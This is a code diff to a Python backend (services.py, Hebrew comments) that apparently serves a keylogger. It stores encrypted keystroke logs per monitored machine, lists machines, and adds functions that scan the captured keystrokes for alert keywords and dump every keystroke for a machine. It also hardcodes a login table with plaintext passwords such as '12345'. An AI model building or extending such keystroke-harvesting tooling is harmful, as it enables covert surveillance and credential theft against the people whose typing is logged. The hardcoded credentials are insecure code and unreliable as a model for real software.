@@ -11,8 +11,6 @@ agent_settings = {
     "key_encryptor": "nmrd",
 }
 
-# services.py
-
 # רשימת משתמשים מורשים
 VALID_USERS = {
     "מאיר": "12345",
@@ -23,8 +21,6 @@ VALID_USERS = {
 def is_valid_user(username: str, password: str) -> bool:
     """בודק אם שם המשתמש והסיסמה נכונים"""
     return username in VALID_USERS and VALID_USERS[username] == password
-
-
 
 def update_settings(data):
     for key, value in data.items():
@@ -46,7 +42,6 @@ def save_notification(text):
         alerts.append(text)
     with open(file_path, "w", encoding="utf-8") as f:
         json.dump(alerts, f, ensure_ascii=False, indent=2)
-
 
 def get_notifications(file_path="notifications.json"):
     if not os.path.exists(file_path):
@@ -81,6 +76,21 @@ def delete_notification(notification_id):
     with open(file_path, "w", encoding="utf-8") as f:
         json.dump(alerts, f, ensure_ascii=False, indent=2)
 
+def get_warnings():
+    arr_notifications = get_notifications()
+    key_of_notification = []
+    data = {}
+    for notification in arr_notifications:
+        notice = json.loads(notification)
+        key_of_notification.append(notice.get("keywords"))
+
+    arr_machine = get_machines_list()
+    for machine in arr_machine:
+        res_find_notice = find_warnings_in_data(machine, key_of_notification)
+        if res_find_notice:
+            data.setdefault(machine, []).append(res_find_notice)
+    return data
+
 def save_keystrokes(data):
     enc = Encryptor()
     data = enc.encrypt_dict(data)
@@ -99,12 +109,42 @@ def save_keystrokes(data):
 
     flat = payload.pop(next(iter(payload)))
     merged = deep_merge(flat, base)
+
     with open(path, "w", encoding="utf-8") as f:
         json.dump(merged, f, indent=4, ensure_ascii=False)
     return path
 
 def get_machines_list():
-    return jsonify(os.listdir(LOG_DIR)) if os.path.exists(LOG_DIR) else jsonify([])
+    return os.listdir(LOG_DIR) if os.path.exists(LOG_DIR) else []
+
+def find_warnings_in_data(machine, warnings):
+    data = {}
+    folder = os.path.join(LOG_DIR, machine)
+    for filename in os.listdir(folder):
+        file_n = filename[:-8]
+        full_path = os.path.join(folder, filename)
+        with open(full_path, "r", encoding="utf-8") as f:
+            file_content = json.load(f)
+            for k,v in file_content.items():
+                if isinstance(v, dict):
+                    for k_k , v_v in v.items():
+                        if any(k in w or k_k in w or v_v in w for w in warnings):
+                            data.setdefault(file_n, {}).setdefault(k, {}).setdefault(k_k, v_v)
+    if data:
+        return data
+    return None
+
+def get_all_keystrokes(machine):
+    data = {}
+    folder = os.path.join(LOG_DIR, machine)
+    for filename in os.listdir(folder):
+        full_path = os.path.join(folder, filename)
+        with open(full_path, "r", encoding="utf-8") as f:
+            file_n = filename[:-8]
+            data[file_n] = json.load(f)
+    if data:
+        return data
+    return None
 
 def get_keystrokes(request):
     machine = request.args.get("machine")
@@ -144,5 +184,5 @@ def get_keystrokes(request):
                     if (t:=timekey(k)) is None or (start_t <= t <= end_t)}
         if filtered:
             out.append(json.dumps(filtered, ensure_ascii=False, indent=2))
-            print(out)
     return out
+
